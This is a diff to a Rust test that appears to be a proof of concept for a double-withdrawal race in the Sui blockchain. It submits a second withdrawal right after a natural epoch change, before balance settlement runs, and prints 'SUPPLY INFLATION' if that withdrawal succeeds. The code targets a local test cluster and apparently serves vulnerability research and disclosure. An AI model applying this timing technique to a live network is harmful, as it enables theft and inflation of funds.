@@ -4,10 +4,16 @@
 use sui_types::base_types::dbg_addr;
 use sui_test_transaction_builder::FundSource;
 use test_cluster::addr_balance_test_env::TestEnvBuilder;
+use test_cluster::TestClusterBuilder;
 
 #[tokio::test]
 async fn poc_double_withdrawal_across_epoch_boundary() {
-    let mut test_env = TestEnvBuilder::new().build().await;
+    let mut test_env = TestEnvBuilder::new()
+        .with_test_cluster_builder_cb(Box::new(|builder| {
+            builder.with_epoch_duration_ms(10000) // 10s epochs
+        }))
+        .build()
+        .await;
     let sender = test_env.get_sender(0);
 
     test_env.fund_one_address_balance(sender, 1000).await;
@@ -21,12 +27,15 @@ async fn poc_double_withdrawal_across_epoch_boundary() {
         )
         .build();
     test_env.exec_tx_directly(tx_a).await.unwrap();
-    println!("TX-A (epoch 0): success");
+    println!("TX-A (epoch 0): success — waiting for natural epoch change");
 
-    // Wait for natural epoch change — does NOT force settlement like trigger_reconfiguration()
+    // Natural epoch change: does NOT force settlement like trigger_reconfiguration()
+    // Settlement TX is in checkpoint K+1, AFTER the epoch changes
     test_env.cluster.wait_for_epoch(Some(1)).await;
-    println!("Epoch 1 reached via wait_for_epoch (settlement may not have run yet)");
+    println!("Epoch 1 reached — immediately submitting TX-B before settlement");
 
+    // TX-B: if settlement has NOT run yet, balance=1000 still visible
+    // and new scheduler (reset at reconfigure) sees stale balance=1000
     let tx_b = test_env
         .tx_builder(sender)
         .transfer_sui_to_address_balance(
@@ -38,10 +47,10 @@ async fn poc_double_withdrawal_across_epoch_boundary() {
     match test_env.exec_tx_directly(tx_b).await {
         Ok(_) => {
             println!("=== CRITICAL: TX-B SUCCEEDED = DOUBLE WITHDRAWAL CONFIRMED ===");
-            println!("Deposited 1000 MIST, extracted 2000 MIST = SUPPLY INFLATION");
+            println!("1000 MIST deposited → 2000 MIST extracted = SUPPLY INFLATION");
         }
         Err(e) => {
-            println!("TX-B failed: {}", e);
+            println!("TX-B failed (settlement already ran before TX-B): {}", e);
         }
     }
 }
